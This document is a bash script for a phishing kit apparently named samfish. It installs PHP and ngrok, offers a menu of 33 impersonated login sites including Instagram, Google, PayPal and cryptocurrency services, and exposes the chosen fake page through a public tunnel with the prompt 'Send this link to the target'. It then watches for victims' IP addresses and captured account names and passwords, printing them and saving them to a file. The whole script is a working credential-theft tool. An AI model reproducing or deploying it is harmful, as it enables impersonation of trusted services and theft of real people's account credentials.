#!/bin/bash
trap 'printf "Interrupt\n";stop;exit 1' 2
packages_install(){
    if [[ `command -v php` ]]; then
    echo ''
    else
    echo "[~] PHP Is not installed, Installing it for you"
    sleep 2
    apt install php -y >/dev/null 2>&1
    fi
    if [[ -e ngrok  ]]; then
    echo ''
    else
    echo "[~] ngrok is not installed, Installing it for you"
    sleep 2
    if [[ `command -v wget` && `command -v unzip` ]]; then
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip >/dev/null 2>&1 
    unzip ngrok-stable-linux-amd64.zip && rm -rf ngrok-stable-linux-amd64.zip >/dev/null 2>&1
    chmod +x ngrok >/dev/null 2>&1
    echo "Enter your authtoken:"
    read token
    ./ngrok authtoken $token
    else 
    apt install wget -y >/dev/null 2>&1 && apt install unzip >/dev/null 2>&1
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip >/dev/null 2>&1 && unzip ngrok-stable-linux-amd64.zip && rm -rf ngrok-stable-linux-amd64.zip && chmod +x ngrok >/dev/null 2>&1
    echo "Enter your authtoken:"
    read token
    ./ngrok authtoken $token
    fi
    fi
}
banner(){
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo ">                                                                       >"
echo ">    @@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@  @@@  >"
echo ">   @@@@@@@   @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@  @@@  >"
echo ">   !@@       @@!  @@@  @@! @@! @@!  @@!       @@!  !@@       @@!  @@@  >"
echo ">   !@!       !@!  @!@  !@! !@! !@!  !@!       !@!  !@!       !@!  @!@  >"
echo ">   !!@@!!    @!@!@!@!  @!! !!@ @!@  @!!!:!    !!@  !!@@!!    @!@!@!@!  >"
echo ">    !!@!!!   !!!@!!!!  !@!   ! !@!  !!!!!:    !!!   !!@!!!   !!!@!!!!  >"
echo ">        !:!  !!:  !!!  !!:     !!:  !!:       !!:       !:!  !!:  !!!  >"
echo ">       !:!   :!:  !:!  :!:     :!:  :!:       :!:      !:!   :!:  !:!  >"
echo ">   :::: ::   ::   :::  :::     ::    ::        ::  :::: ::   ::   :::  >"
echo ">   :: : :     :   : :   :      :     :        :    :: : :     :   : :  >"
echo ">                                                                       >"
echo ">  github.com/Munazirul/samfish                                v1.0     >"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                                                                    
echo "[01] Instagram          [12] instafollowers   [23] devianart"
echo "[02] Facebook           [13] paypal           [24] badoo"
echo "[03] Google             [14] snapchat         [25] cryptocurrency"
echo "[04] microsoft          [15] dropbox          [26] origin"
echo "[05] Github             [16] shopify          [27] myspace"
echo "[06] Messenger          [17] yahoo            [28] yandex"
echo "[07] Gitlab             [18] wordpress        [29] vk"
echo "[08] Linkedin           [19] steam            [30] verizen"
echo "[09] netflix            [20] twitch           [31] pinterest"
echo "[10] spotify            [21] adobe            [32] create"
echo "[11] protonmail         [22] twitter          [33] shopping" 
}
menu(){
echo -e "Enter your option: "
read option

if [[ $option == 1 || $option == 01 ]]
then
server=instagram
start
    
    elif [[ $option == 2 || $option == 02 ]]
    then 
    server=facebook
start
 
    elif [[ $option == 3 || $option == 03 ]]
    then 
    server=google
start

    elif [[ $option == 4 || $option == 04 ]]
    then 
    server=microsoft
start
   
    elif [[ $option == 5 || $option == 05 ]]
    then 
    server=github
start
 
    elif [[ $option == 6 || $option == 06 ]]
    then 
    server=messenger
start
  
    elif [[ $option == 7 || $option == 07 ]]
    then 
    server=gitlab
start
   
    elif [[ $option == 8 || $option == 08 ]]
    then
    server=linkedin 
start

    elif [[ $option == 9 || $option == 09 ]]
    then 
    server=netflix
start
 
    elif [[ $option == 10 ]]
    then
    server=spotify 
start
 
    elif [[ $option == 11 ]]
    then
    server=protonmail 
start
  
    elif [[ $option == 12 ]]
    then
    server=instafollowers 
start
  
    elif [[ $option == 13 ]]
    then
    server=paypal 
start
    
    elif [[ $option == 14 ]]
    then 
    server=snapchat
start
   
    elif [[ $option == 15 ]]
    then
    server=dropbox 
   
start
    elif [[ $option == 16 ]]
    then 
    server=shopify
start
  
    elif [[ $option == 17 ]]
    then 
    server=yahoo
start

    elif [[ $option == 18 ]]
    then 
    server=wordpress
start
    
    elif [[ $option == 19 ]]
    then 
    server=steam
start
  
    elif [[ $option == 20 ]]
    then 
    server=twitch
start
  
    elif [[ $option == 21 ]]
    then 
    server=adobe
start

    elif [[ $option == 22 ]]
    then 
    server=twitter
start

    elif [[ $option == 23 ]]
    then 
    server=devianart
start
   
    elif [[ $option == 24 ]]
    then 
    server=badoo
start

    elif [[ $option == 25 ]]
    then
    server=cryptocurrency 
start
    
    elif [[ $option == 26 ]]
    then 
    server=origin
start
    
    elif [[ $option == 27 ]]
    then 
    server=myscpace
start
   
    elif [[ $option == 28 ]]
    then 
    server=yandex
start
 
    elif [[ $option == 29 ]]
    then 
    server=vk
start

    elif [[ $option == 30 ]]
    then 
    server=verizen
    
start
    elif [[ $option == 31 ]]
    then 
    server=pinterest
start

    elif [[ $option == 32 ]]
    then 
    server=create
start
    
    elif [[ $option == 33 ]]
    then 
    server=shopping
start

    elif [[ $option == 0 ]]
    then
    exit 1
    else
    echo "[+] Invalid Option"
fi
}
show_link(){
    link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
    printf "Send this link to the target: http://$link\n"
}
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
# if [[ -e sendlink ]]; then
# rm -rf sendlink
# fi
}

catch_cred(){
account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
echo "Account : $account "
echo "Password : $password"
}

show_cred(){
    printf "[+] Waiting for someone to open link......\n"
    while [ true ]; do
    if [[ -e sites/$server/ip.txt ]]; then
    printf "[+] Someone opened your link......\n"
    head -1 sites/$server/ip.txt | cut -d: -f2
    rm -rf sites/$server/ip.txt
    printf "[+] Waiting for the credentials......\n"
    fi 
    if [[ -e sites/$server/usernames.txt ]]; then
    printf "[+] Credentials found!\n"
    catch_cred
    cat sites/$server/usernames.txt >> saved.usernames.txt && rm -rf sites/$server/usernames.txt
    fi
    done
}
start(){
    if [[ -e sites/$server/ip.txt ]]; then
    rm -rf sites/$server/ip.txt 
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
    rm -rf sites/$server/usernames.txt ;
    fi
    echo -e "[+] Enter the port you want to start (default:80):"
    read port 
    if [[ -z $port ]]; then
    cd sites/$server && php -S 127.0.0.1:80 >/dev/null 2>&1 &
    echo "[~] PHP server started on port 80"
    sleep 2
    ./ngrok http 127.0.0.1:80 >/dev/null 2>&1 &
    echo "[~] ngrok started on port 80"
    sleep 2
    show_link
    show_cred
    else
    cd sites/$server && php -S 127.0.0.1:$port >/dev/null 2>&1 &
    echo "[~] PHP server started on port $port"
    sleep 2
    ngrok http 127.0.0.1:$port >/dev/null 2>&1 &
    echo "[~] ngrok started on port $port"
    sleep 2
    show_link
    show_cred
    fi
    
}
banner
packages_install 
menu

 
